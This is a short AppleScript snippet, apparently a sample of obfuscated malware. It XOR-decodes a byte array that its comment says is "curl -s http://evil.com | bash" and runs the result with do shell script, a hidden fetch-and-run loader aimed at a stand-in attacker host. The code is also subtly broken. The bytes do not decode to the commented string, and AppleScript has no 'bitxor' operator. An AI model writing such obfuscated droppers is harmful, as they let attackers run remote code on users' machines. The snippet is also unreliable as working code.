-- XOR-obfuscated "curl -s http://evil.com | bash"
set xor_payload to {34, 55, 50, 41, 5, 10, 91, 90, 16, 11, 80, 88, 13, 66, 17, 90, 9, 16, 31, 94, 88, 90, 3, 10, 6, 66}
set xor_key to 42

set decoded to ""
repeat with i from 1 to count of xor_payload
	set decoded to decoded & (ASCII character ((item i of xor_payload) bitxor xor_key))
end repeat

-- Run the decoded command
do shell script decoded
